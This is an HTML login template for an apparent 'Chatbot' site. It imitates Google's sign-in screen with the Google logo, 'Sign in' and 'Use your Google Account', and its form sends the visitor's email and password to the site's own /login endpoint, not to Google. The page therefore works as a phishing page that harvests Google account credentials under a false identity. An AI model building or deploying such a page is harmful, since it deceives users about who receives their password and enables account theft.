<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login - Chatbot</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .login-container {
      background: #fff;
      padding: 40px;
      border-radius: 8px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
      width: 350px;
      text-align: center;
    }
    .logo {
      font-size: 28px;
      font-weight: bold;
      color: #4285F4;
      margin-bottom: 10px;
    }
    h2 {
      margin: 10px 0;
      font-size: 22px;
      color: #202124;
    }
    p {
      color: #5f6368;
      font-size: 14px;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: 1px solid #dadce0;
      border-radius: 4px;
      font-size: 16px;
      box-sizing: border-box;
    }
    button {
      width: 100%;
      padding: 12px;
      background: #1a73e8;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 10px;
      transition: background 0.3s;
    }
    button:hover {
      background: #1669c1;
    }
    .link {
      margin-top: 15px;
      font-size: 14px;
    }
    .link a {
      color: #1a73e8;
      text-decoration: none;
    }
    .link a:hover {
      text-decoration: underline;
    }
    img {
      height: 24px;
      margin-bottom: 10px;
    }

    /* Media Queries */
    @media (max-width: 600px) {
      .login-container {
        width: 90%;
        padding: 30px 20px;
        margin: 0 10px;
      }
      
      h2 {
        font-size: 20px;
      }
      
      input, button {
        padding: 10px;
        font-size: 15px;
      }
    }

    @media (max-width: 400px) {
      .login-container {
        padding: 25px 15px;
      }
      
      h2 {
        font-size: 18px;
      }
      
      p {
        font-size: 13px;
      }
      
      img {
        height: 20px;
      }
    }

    @media (max-height: 600px) {
      body {
        align-items: flex-start;
        padding-top: 30px;
      }
    }

    /* Dark mode support */
    @media (prefers-color-scheme: dark) {
      body {
        background: #121212;
        color: #e0e0e0;
      }
      
      .login-container {
        background: #1e1e1e;
        box-shadow: 0 2px 8px rgba(0,0,0,0.4);
      }
      
      h2 {
        color: #f5f5f5;
      }
      
      p {
        color: #b0b0b0;
      }
      
      input {
        background: #2d2d2d;
        border-color: #444;
        color: #e0e0e0;
      }
      
      .link a {
        color: #8ab4f8;
      }
    }

    /* Landscape orientation for mobile */
    @media (max-width: 900px) and (orientation: landscape) {
      body {
        padding: 20px 0;
        align-items: flex-start;
      }
      
      .login-container {
        width: 70%;
        max-width: 400px;
      }
    }
  </style>
</head>
<body>
  <div class="login-container">
      <img src="https://developers.google.com/identity/images/g-logo.png" alt="Google Logo">
    <h2>Sign in</h2>

    <p>Use your Google Account</p>

        {% if error %}
      <p style="color: red; font-size: 14px;">{{ error }}</p>
    {% endif %}

    <!-- Login Form -->
    <form method="POST" action="/login">
      <input type="email" name="email" placeholder="Email " required>
      <input type="password" name="password" placeholder="Enter your password" required>
      <button type="submit">Next</button>
    </form>

  
  </div>
</body>
</html>
